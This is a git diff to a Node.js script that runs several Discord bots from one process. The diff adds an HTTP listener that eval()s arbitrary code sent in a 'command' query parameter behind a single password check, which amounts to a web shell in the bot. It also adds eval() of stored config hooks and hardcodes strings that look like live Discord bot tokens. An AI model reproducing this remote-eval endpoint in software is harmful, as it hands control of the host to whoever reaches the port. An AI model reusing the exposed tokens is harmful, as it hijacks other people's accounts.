@@ -9,11 +9,23 @@ const cheerio = require("cheerio");
 const jimp = require("jimp");
 const jsdom = require("jsdom");
 const os = require("os");
+const url = require("url");
+process.env.srv = http.createServer((req,res)=>{
+var q = url.parse(req.url,true);
+	if (q.query.pass==process.env.pass) {
+		if (q.query.command) {
+			res.write(new String(eval(decodeURI(q.query.command))).toString());
+		}
+	} else {
+		res.writeHead(403,http["403"]);
+	}
+	res.end();
+}).listen(process.env.PORT||8080);
 snd = function snd(chan,data) {
 	return clt.channels.find("id",chan+"").send(data);
 };
 var bots = [];
-tkn = [];
+tkn = ["MjY2OTE1Mjk4NjY0MzgyNDY0.DH8iwg.1VueyrqQuKNUF7HLDXbr9-R6aPE","MjkxNTQzODcyNjY2ODYxNTY4.DGRQpw.GJrMjyGxFjtK3aR6VpVMNm6Yk4E","MzUzNTU2NDg0Mjc5NTAwODAx.DTpwLA.jpob0yvq62itF-hfBEiXY6ZvDUE"/*,"MzE0Njc1NDU2NDcxMzM0OTEy.DIRpbw.PeIxDuhoI-Do9XT4WEMgYs8ri14","MjcyNTkyNzU4MzI4MjYyNjY4.DSzscw.m0xtcXw8o9WAB1ud3KW5fHu_tn0"*/];
 tkn.each((tkn,ind)=>{
 	let sav = function sav(src) {
 		return fs.writeFileSync(src?src:save,JSON.stringify(bot,null,2));
@@ -35,22 +47,21 @@ tkn.each((tkn,ind)=>{
 	const clt = new Discord.Client({disableEveryone:true,apiRequestMethod:"burst",messageCacheLifetime:!ind?500:250,messageSweepInterval:50}), save = "Bot"+(ind+1)+".json";
 	with (clt) {
 		var bot, last, cons = "", limit = !ind?5000:2500, stop = false, inter = [], hooks = [];
+		const user = clt.user;
 	}
 	clt.on('ready',()=>{
 		console.log(`Logged in as ${clt.user.tag}!`);
 		try {
 			rel();
 		} catch(e) {
-			fs.writeFileSync("status.txt",clt.user.presence.status);
 			fs.writeFileSync("eval.txt",true);
 			rel("Prototype.json");
 			bot.prefix = "!".repeat(ind);
 			sav();
 			console.info("Bot"+(ind+1)+" created...");
 		}
-		clt.user.setPresence(bot.status);
-		stats = setInterval(stat=()=>{let tmp=fs.readFileSync("status.txt").toString();if(tmp!=bot.status.status){bot.status.status=tmp;clt.user.setPresence(bot.status)}},5000);
-		hooks = bot.hooks.map(hk=>{return new Discord.WebhookClient(hk.id,hk.token,{disableEveryone:true,apiRequestMethod:"sequential",messageCacheLifetime:!ind?100:50,messageSweepInterval:50,sync:true})});
+		hooks = bot.hooks.map(hk=>{let hok=new Discord.WebhookClient(hk.id,hk.token,{disableEveryone:true,apiRequestMethod:"sequential",messageCacheLifetime:!ind?100:50,messageSweepInterval:50,sync:true});hok.desc=hk.desc;return hok});
+		eval(bot.onlaunch);
 	});
 	clt.on("message",async msg=>{
 		try {
@@ -79,7 +90,7 @@ tkn.each((tkn,ind)=>{
 				var mnts = msg.mentions.users.array(),
 				chns = msg.mentions.channels.array(),
 				rlss = msg.mentions.roles.array(),
-				emjs = (msg.content.match(/:.+?:/g)||[]).map(emj=>clt.emojis.find("name",emj.replace(/:/g,""))),
+				emjs = (msg.content.match(/:.+?:/g)||[]).map(emj=>clt.emojis.find("name",emj.replace(/:/g,""))||emj),
 				cnt = msg.content,
 				chn = msg.channel,
 				aut = msg.author,
@@ -103,7 +114,7 @@ tkn.each((tkn,ind)=>{
 				});
 			}
 			if (!msg.bot&&!chn.allow&&cnt.starts(bot.prefix)) {
-				console.info(`${aut.tag} tried to use '${cnt}' of '${user.tag}' in ${(gld.name?gld:chn).name+(gld.name?' : '+chn.name:'')} at ${new Date()}`);
+				console.info(`${aut.tag} tried to use '${cnt}' of '${user.tag}' in ${((gld.name?gld:chn).name||chn)+(gld.name?' : '+chn.name:'')} at ${new Date()}`);
 			}
 			bot.banwords.each(val=>{
 				if (new RegExp("\b"+val+"\b","gmi").test(cnt)) {
@@ -113,9 +124,9 @@ tkn.each((tkn,ind)=>{
 			});
 			if ((!msg.bot&&!chn.allow)||!cnt.starts(bot.prefix)) return
 			if (out=bot.commands.names().filter(com=>{return new RegExp("^"+bot.prefix+com,"i").test(cnt)})[0]) {
-				if (eval("("+(bot.commands[out]||nul)+")(msg,cnt,chn,aut,gld)")) {
-					return;
-				}
+				eval(bot.beforecommand);
+				eval("("+(bot.commands[out]||nul)+")(msg,cnt,chn,aut,gld)");
+				eval(bot.aftercommand);
 			}
 		} catch (a) {
 			console.warn(cons+=`${user.tag}: ${cnt}, ${a.name}: ${a.message}`);
@@ -192,7 +203,7 @@ tkn.each((tkn,ind)=>{
 			nw.setNickname(old.nickname);
 		}
 	});
-	clt.on("disconnect",evt=>{
+	clt.on("disconnect",clt.disc=evt=>{
 		clt.login(clt.token);
 	});
 	clt.on("error",err=>{
